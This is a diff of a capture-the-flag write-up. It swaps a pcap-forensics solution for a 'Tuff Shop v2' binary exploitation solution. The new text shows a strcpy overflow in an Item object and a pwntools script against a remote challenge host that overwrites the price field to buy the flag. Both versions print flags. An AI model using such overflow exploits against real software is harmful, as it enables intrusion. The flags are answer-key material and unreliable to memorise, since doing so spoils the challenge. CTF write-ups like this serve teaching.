@@ -1,35 +1,46 @@
-# I Forgot Something
-> Abis capture network website gweh, tentunya gada yang aneh lah ya?
+# Tuff Shop v2 
+> Oh my god! You just haxxed the reallly tuff shop again! But this time you got in their secret admin system... Can you pull off the best six seven prank in this secret build?
 
-Author: Rev
+Author: wintertia
 
 
 ## About the Challenge
-This challenge gives a chall.pcap
+This challenge gives a main elf which contains a shop. and we are asked to buy a flag in the shop
 
 ## How to Solve?
 
-We initially tried a few common techniques:
+First we dissasemble this elf to know what actually it do, using this command
+```
+objdump -d main > main.asm
+```
+I found strcpy calls in _ZN4ItemC1EPKci (constructor) and _ZN4Item8editNameEv that call strcpy on the Item object's buffer—this indicates an infinite copy → potential overflow.
+Look at the Item object's layout: the constructor writes mov %edx,0x40(%rax) → the price field is at offset 0x40 of the base object.
 
-- Analyze chall.pcap using wireshark
+Here, I created an exploit file that uses the pwn tool to create an item (index 0), uses editName (which calls strcpy) to overflow the name to the byte at offset 0x40, changes that byte to a lowercase (e.g., ASCII '1' = 0x31) so that price <= aura, and then selects the buy option to trigger flag().
 
-Lets try open this pcap using wireshark. i can see many export object using http. lets save them
-
-
+```
+from pwn import *
+p=remote('intersec.hcs-team.com',10118)
+def m(n):
+    p.recvuntil(b'>',timeout=5)
+    p.sendline(str(n).encode())
+m(1)
+p.sendline(b'ITEM')
+m(2)
+p.sendline(b'0')
+p.sendline(b'A'*0x40+b'1')
+m(4)
+p.sendline(b'0')
+print(p.recvall(timeout=5).decode(errors='ignore'))
 
 ```
 
+<img width="786" height="574" alt="image" src="https://github.com/user-attachments/assets/62108305-fb7a-4ec2-a8b1-2ba98046221d" />
 
-```
-<img width="746" height="489" alt="Screenshot from 2025-09-15 10-33-18" src="https://github.com/user-attachments/assets/9abd5d4a-28f1-4f63-af5d-b427ebd485d8" />
-
-We got the password here : estrella. lets try using to open the flag.txt
-
-<img width="911" height="901" alt="Screenshot from 2025-09-15 10-34-09" src="https://github.com/user-attachments/assets/bf4df688-9b68-4cc0-89d6-1bab111ca483" />
 
 Boom. we got the flag
 
 ## Flag
 ```
-HCS{makasih_udah_berhasil_bantuin_aku_buat_dapetin_filenya_ehe}
+HCS{omg_h343p_g00att_s0_tUFFFF_<3_ffd393e9-3dce-4a6b-beb3-3101c450c914}
 ```
